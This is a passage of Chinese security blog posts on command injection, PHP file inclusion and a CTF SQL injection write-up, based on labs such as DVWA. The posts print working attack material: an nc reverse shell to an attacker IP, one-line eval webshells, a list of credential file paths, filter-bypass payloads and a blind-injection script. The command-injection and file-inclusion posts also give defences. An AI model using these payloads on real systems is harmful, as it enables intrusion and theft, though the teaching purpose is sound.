class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210530173408877.png" alt="image-20210530173408877"></p><p><strong>命令执行常用连接字符</strong></p><ul><li>cmd1|cmd2:无论cmd1是否执行成功，cmd2将被执行</li><li>cmd1;cmd2:无论cmd1是否执行成功，cmd2将被执行</li><li>cmd1||cmd2:仅在cmd1执行失败时才执行cmd2</li><li>cmd1&amp;&amp;cmd2:仅在cmd1执行成功后时才执行cmd2</li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>靶场：DVWA-Command Injection</p><h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><p>未对用户输入的参数IP做任何过滤，构造payload：127.0.0.1|whoami</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531000905013.png" alt="image-20210531000905013"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>更多姿势见：<a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">LINUX下反弹SHELL的种种方式</a></p><p><strong>nc反弹shell</strong></p><p>先在attacker机器上监听某一端口</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531000237919.png" alt="image-20210531000237919"></p><p>利用命令执行漏洞反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.101.187 6666 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531000306609.png" alt="image-20210531000306609"></p><p>可以看到shell成功反弹到了kali上面，可以执行命令：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531000350723.png" alt="image-20210531000350723"></p><h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>payload1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|echo &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;&gt;1.php</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531003610100.png" alt="image-20210531003610100"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531003851239.png" alt="image-20210531003851239"></p><p>payload2（分号被过滤时）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|echo &quot;&lt;?php ($_&#x3D;@$_GET[2]).@$_($_POST[1])?&gt;&quot;&gt;3.php</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531004035590.png" alt="image-20210531004035590"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531004530326.png" alt="image-20210531004530326"></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p><strong>禁用高危系统函数</strong></p><p>phpinfo() 、eval() 、passthru() 、chroot()、 scandir()、chgrp() 、 chown() 、 shell_exec() 、 proc_open()、proc_get_status() 、 ini_alter() 、ini_alter()、ini_restore()、dl()、 pfsockopen() 、 openlog() 、syslog()、 readlink()、symlink() 、 popepassthru() 、stream_socket_server() 、fsocket() 、 fsockopen()</p><p>在php安装目录中找到php配置文件php.ini，找到disable_functions，在后面添加禁用的函数名，函数名之间以英文逗号分隔</p><p><strong>严格过滤特殊字符</strong></p><p>从前面的例子可以发现在利用命令执行漏洞时会利用一些特殊的连接符，用来拼接执行的命令。对此，可创建仅包含允许的字符或命令列表的白名单以验证用户输入。</p><p><strong>开启safe_mode</strong></p><p>safe_mode : php安全模式，通俗的说就是以安全模式运行php</p><p>在php.ini文件里面设置safe_mode = On即可开启</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">LINUX下反弹SHELL的种种方式</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 命令执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞学习</title>
      <link href="posts/38386.html"/>
      <url>posts/38386.html</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><strong>什么是文件包含？</strong></p><p>将需要重复调用的函数写入一个文件，对该文件进行包含时产生的操作。</p><p><strong>漏洞产生原因</strong></p><p>文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他恶意文件，导致了执行非预期代码。</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出，改变URL中filename的值即可改变代码中包含的文件。</p><p><strong>PHP中的文件包含函数</strong></p><ul><li><code>include</code> 函数出现错误时，会抛出警告，但程序仍继续执行。</li><li><code>include_once</code> 同 include ，但仅包含一次（避免函数重定义，变量重新赋值等问题）。</li><li><code>require</code> 函数出现错误时，会直接报错并退出程序执行。</li><li><code>require_once</code> 同 require ，但仅包含一次。</li></ul><h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>被包含的文件在服务器本地</p><p><strong>包含本地敏感文件</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527204155548.png" alt="image-20210527204155548"></p><p>敏感文件默认路径列举（以下目录随系统版本不同而有差异）：</p><ul><li><p>windows系统:</p><p>C:\windows\win.ini            //基本系统配置文件</p><p>C:\boot.ini                      //查看系统版本</p><p>C:\windows\system32\inetsrv\MetaBase.xml                     //iis配置文件</p><p>C:\windows\repair\same                        //存储windows系统初次安装密码</p><p>C:\ProgramFiles\mysql\my.ini                        //mysql配置信息</p><p>C:\ProgramFiles\mysql\data\mysql\user.MYD                    //mysql root密码</p><p>C:\windows\php.ini                             //php配置信息</p></li><li><p>linux/unix系统:</p><p>/etc/passwd                                   //账户信息<br>/etc/shadow                                  //账户密码文件<br>/usr/local/app/apache2/conf/httpd.conf                    //Apache2默认配置文件<br>/usr/local/app/apache2/conf/extra/httpd-vhost.conf                     //虚拟网站配置<br>/usr/local/app/php5/lib/php.ini                             //php相关配置<br>/etc/httpd/conf/httpd.conf                          //apache配置信息<br>/etc/my.conf                               //mysql配置文件</p></li></ul><p><strong>包含上传文件</strong></p><blockquote><p>包含文件的内容只要符合php语法都能被当成php代码进行执行，无关后缀名是什么。</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527203723802.png" alt="image-20210527203723802"></p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>被包含的文件在远程服务端</p><blockquote><p>条件：php.ini中设置allow_url_fopen = On(默认)、allow_url_include = On ( php5.2后默认为off )</p></blockquote><p><strong>包含远程文件</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527210839912.png" alt="image-20210527210839912"></p><p><strong>包含远程shell</strong></p><p>remoteshell.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;&lt;?php eval(\$_POST[&#x27;shell&#x27;]);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$myfile</span>=fopen(<span class="string">&#x27;test.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;can&#x27;t open the file!&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$payload</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527214700058.png" alt="image-20210527214700058"></p><p>包含构造好的文件后，会在当前目录下创建test.php，即写入一句话木马，可以对其进行利用，后续也可用菜刀进行连接</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527215840715.png" alt="image-20210527215840715"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527215247349.png" alt="image-20210527215247349"></p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="利用PHP伪协议"><a href="#利用PHP伪协议" class="headerlink" title="利用PHP伪协议"></a>利用PHP伪协议</h2><p>何为伪协议？简单的说，就是自己定义的协议，也只有自己的软件支持，其他软件都不识别的协议就是伪协议。</p><p>在PHP中，PHP给自己定义了一个php伪协议，以：<code>php://</code>起头。</p><p>至于<code>http://</code>、<code>file://</code>这些都不是伪协议，都是大部分系统/软件都支持的协议，共享同一套协议标准。</p><p><strong>php://filter</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201001030030448.webp" alt="php://filter参数"></p><p>php伪协议的过滤器功能，可以通过拼接各种过滤器达到快速转换字节流的效果。如：</p><blockquote><p>php://filter/read=convert.base64-encode/resource=index.php</p><p>其中<code>filter/[read|write]=[过滤器]</code>可简写为<code>filter/[过滤器]</code>，php会自选判断是read还是write。</p></blockquote><p>此时php会读取index.php文件的内容，通过convert过滤器的base64-encode方法，最总将所得结果以php代码的形式包含到运行的php文件之中，由于base64编码之后的内容不会出现<code>&lt;?</code>，所以必然不会被识别为php代码，故而能起到文件读取的作用。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527233338272.png" alt="image-20210527233338272"></p><p>对其进行base64解码得到源码</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527233513514.png" alt="image-20210527233513514"></p><p>常用的过滤器有：</p><table><thead><tr><th align="left">过滤器名称</th><th align="left">说明</th><th align="left">类别</th><th align="center">版本</th></tr></thead><tbody><tr><td align="left">string.rot13</td><td align="left">rot13转换</td><td align="left">字符串过滤器</td><td align="center">PHP&gt;4.3.0</td></tr><tr><td align="left">string.toupper、string.tolower</td><td align="left">大小写互转</td><td align="left">字符串过滤器</td><td align="center">PHP&gt;5.0.0</td></tr><tr><td align="left">string.strip_tags</td><td align="left">去除<code>&lt;?(.*?)?&gt;</code>的内容</td><td align="left">string.strip_tags</td><td align="center">PHP&lt;7.3.0</td></tr><tr><td align="left">convert.base64-encode、convert.base64-decode</td><td align="left">base64编码转换</td><td align="left">转换过滤器</td><td align="center">PHP&gt;5.0.0</td></tr><tr><td align="left">convert.quoted-printable-encode、convert.quoted-printable-decode</td><td align="left">URL编码转换</td><td align="left">转换过滤器</td><td align="center">PHP&gt;5.0.0</td></tr><tr><td align="left">convert.iconv.编码1.编码2</td><td align="left">任意编码转换</td><td align="left">转换过滤器</td><td align="center">PHP&gt;5.0.0</td></tr><tr><td align="left">zlib.deflate、zlib.inflate</td><td align="left">zlib压缩</td><td align="left">压缩过滤器</td><td align="center">PHP&gt;5.1.0</td></tr><tr><td align="left">bzip2.compress、bzip2.decompress</td><td align="left">zlib压缩</td><td align="left">压缩过滤器</td><td align="center">PHP&gt;5.1.0</td></tr></tbody></table><p><strong>利用 php://input 协议</strong></p><p>主要用来接收post数据，将post请求中的数据作为php代码执行。</p><p>条件：<code>allow_url_include = On</code>(PHP版本&gt;5.2后，默认值为Off)</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527235351691.png" alt="image-20210527235351691"></p><h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h2><p>摘自：<a href="https://xz.aliyun.com/t/8163#toc-15">file_put_content和死亡·杂糅代码之缘</a></p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$content在开头增加了exit过程，导致即使我们成功写入内容，也执行不了，这时候如何绕过？</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210529174557298.png" alt="image-20210529174557298"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;phpinfo.php&amp;content&#x3D;aPD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>对写入内容（这里是<code>&lt;?php phpinfo(); ?&gt;</code>）进行Base64编码（<code>PD9waHAgcGhwaW5mbygpOyA/Pg==</code>），在包含phpinfo.php这个文件时又进行Base64解码，这时写入内容还原，而死亡代码exit()被解码为乱码，达到绕过目的。</p><p>添加额外字符a：Base64解码时是4个byte一组，前面的<code>phpexit</code>一共7个字符，增加一个a凑成8个字符，这样<code>phpexita</code> 被正常解码，而后面我们写入的内容也才会正常解码。</p><blockquote><p>base64编码中只包含64个可打印字符(大小写字母，0-9，+，/)，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210529180216634.png" alt="image-20210529180216634"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210529180259106.png" alt="image-20210529180259106"></p><h2 id="其他协议"><a href="#其他协议" class="headerlink" title="其他协议"></a>其他协议</h2><p>除了php伪协议外，PHP还支持包含以下协议的数据流：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure><p>如利用file协议：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527232103966.png" alt="image-20210527232103966"></p><h2 id="配合日志文件"><a href="#配合日志文件" class="headerlink" title="配合日志文件"></a>配合日志文件</h2><p>如果知道服务器日志文件的路径，可在URL请求中添加攻击代码，此代码会被记录在服务器日志文件内，再对日志文件进行包含，攻击代码便会被执行。（前提有访问权限）</p><p>测试靶场：DVWA</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527230821426.png" alt="image-20210527230821426"></p><p>在日志文件中可见，部分字符被URL编码，代码无法执行，可用burpsuite抓包改回。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527231123446.png" alt="image-20210527231123446"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527231156043.png" alt="image-20210527231156043"></p><p>利用文件包含漏洞包含此日志文件，即可执行插入代码</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527231313524.png" alt="image-20210527231313524"></p><h1 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h1><ul><li>%00截断</li></ul><p>条件：magic_quotes_gps=off      php版本&lt;5.3.4</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;inc/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.php&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里对后缀名进行了限制，可是我们无法上传php文件，满足条件下可用00截断绕过。</p><p>?page=../../../../phpinfo.php%00</p><ul><li>长度截断</li></ul><p>前提：PHP版本&lt;5.2.10</p><p>操作系统对于目录字符串存在长度限制，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code>即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lfi.php?file&#x3D;.&#x2F;.&#x2F;.&#x2F;.&#x2F;[.&#x2F;]+&#x2F;.&#x2F;shell.txt</span><br><span class="line">lfi.php?file&#x3D;.&#x2F;shell.txt&#x2F;.[...]+. # 仅Windows下有效</span><br></pre></td></tr></table></figure><ul><li>重写</li></ul><p>?page=….//….//….//phpinfo.php</p><ul><li>利用php伪协议等</li></ul><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>最简单的，我们可以通过上传一个包含webshell内容的图片，然后通过包含此图片即可得到一个可以控制的webshell。</p><ul><li>获取敏感信息</li><li>执行任意命令</li><li>获取服务器权限</li></ul><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>尽量不使用动态包含，无需情况下设置allow_url_include和allow_url_fopen为关闭;</li><li>对可以包含的文件进行限制︰使用白名单的方式，或者设置包含的目录，open_basedir ;</li><li>严格检查用户输入，参数中不允许出现../之类的目录跳转符;</li><li>严格检查变量是否初始化;</li><li>不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</li></ol><p>参考资料：</p><p>[1] <a href="https://www.0x002.com/2020/PHP%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(LFI)%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">PHP 本地文件包含(LFI)漏洞学习笔记</a></p><p>[2] <a href="https://xz.aliyun.com/t/8163#toc-15">file_put_content和死亡·杂糅代码之缘</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 文件包含 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从CISCN2021初赛习得</title>
      <link href="posts/59734.html"/>
      <url>posts/59734.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>这里简要记录下我的思路以及学到的姿势。</p><p>一开始经过几次尝试发现uname处存在注入点且为单引号括号闭合，在sql语句为真时，返回 login ,为假时空白，于是就傻乎乎认为是布尔盲注，而忽略了加引号时页面会返回报错信息。所以可以用更为简单的报错注入的题，而我却用布尔盲注捣鼓了半天。得到库名后，发现information被过滤，无法查表和列名。艰难绕过后，利用无列名注入，mysql字符串逐位比较把flag给试了出来，但可能因为大小写的原因导致提交错误，白干一场（后来才知道mysql字符串比较不区分大小写😂）解决方法见下文。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210515183010308.png" alt="image-20210515183010308"></p><p>正解报错注入</p><p>暴库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1&#39;)||extractvalue(1,concat(&#39;~&#39;,database()))%23&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p>利用sqlmap获取表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot; 1.txt&quot; –dump -D “security”</span><br></pre></td></tr></table></figure><p>暴列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1&#39;) ||updatexml(&quot;~&quot;,concat(&quot;~&quot;,(select * from (select * from flag as a join flag b)c)),&quot;~&quot;)%23&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p>得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1&#39;)||updatexml(1,((select &#96;e4f94828-d693-4ea1-8759-051b98824ce3&#96; from flag limit 0,1)),1)%23&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p><strong>新姿势&amp;&amp;不足</strong></p><ol><li>当information_schema被过滤，无法查库中表和列时，可以用<code>sys.schema_table_statistics_with_buffer</code>、<code>sys.x$schema_flattened_keys</code> 等来爆表。</li><li>当列名不知道时，一般利用information_schema_columns；再者可利用join进行无列名注入得到列名；若在join被过滤或盲注等情况，此时则可以考虑mysql字符串逐位比较大小。</li><li>当<code>||</code> 、<code>or</code> 等常用字符过滤时也许可以使用 <code>^</code> 异或这个符号，如<code>?id=1&#39;^(payload)^1--+</code></li><li>post传参的Python脚本编写待加强</li></ol><h3 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass information_schema"></a>bypass information_schema</h3><blockquote><p>Mysql5.7后新增了sys库，其基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。可通过sys库取代information_schema获取表名。</p></blockquote><p>sys 中可利用的视图</p><ul><li><strong>sys.schema_table_statistics_with_buffer</strong></li><li><strong>sys.x$schema_table_statistics_with_buffer</strong></li><li><strong>sys.schema_auto_increment_columns</strong></li><li><strong>sys.x$ps_schema_table_statistics_io</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><p>当or被过滤（没过滤in）时，可利用innodb存储引擎获取表名</p><ul><li><strong>mysql.innodb_table_stats</strong> (此表中库名字段是database_name，而非table_schema)</li><li><strong>mysql.innodb_index_stats</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h3 id="join"><a href="#join" class="headerlink" title="join"></a>join</h3><p>通过join进行无列名注入获取列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b)c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;id&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;username&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,username))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure><p>在学习大佬wp时还看到利用join绕过逗号过滤，tql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p>不用逗号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select * from (select 1)a join (select 2)b join (select 3)c--+</span></span><br></pre></td></tr></table></figure><h3 id="mysql字符串逐位比较"><a href="#mysql字符串逐位比较" class="headerlink" title="mysql字符串逐位比较"></a>mysql字符串逐位比较</h3><p>给定两个字符串，会各取两个字符串的首字符ascii码来比较，如下图</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517195727369.png" alt="image-20210517195727369"></p><p>由此可知后一字符串首位为f，若首位相同，则会比较下一位，以此类推便可得到后一字符串内容。</p><p>但mysql比较两个字符串是不区分大小写的！本应是B(66)&lt;a(97)</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517210315933.png" alt="image-20210517210315933"></p><p>怎么能达到区分大小写的效果呢？我在这篇文章中找到答案（大佬tql！）</p><p><a href="https://nosec.org/home/detail/3830.html">无需“in”的SQL盲注</a></p><p>将字符串转换为二进制格式后，会强制进行字节对字节的比较</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517215444478.png" alt="image-20210517215444478"></p><p>但binary函数中的in被过滤了，无法使用。</p><p>新的方法是用concat拼接一个JSON对象，即<code>select concat(&#39;B&#39;,cast(0 as json))</code>也会返回一二进制字符串</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517222742475.png" alt="image-20210517222742475"></p><p>也可以把字符转化为十六进制后比较，B(0x42)&lt;a</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>由于题目环境已关，这里在BUUCTF找到了一道类似的题以练习。</p><p>[GYCTF2020]Ezsqli</p><p>fuzz后，发现这里也过滤了information，考虑利用sys</p><p>简单尝试后，发现没有回显，也没有报错，当语句为真时返回Nu1L，为假时返回V&amp;N，考虑布尔盲注。</p><p>判断表名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://ead240c2-1793-45a6-8939-a0db7ad04826.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))=&#123;&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        py = payload.<span class="built_in">format</span>(j,i)</span><br><span class="line">        post_data = &#123;<span class="string">&#x27;id&#x27;</span>: py&#125;</span><br><span class="line">        re = requests.post(url, data=post_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span 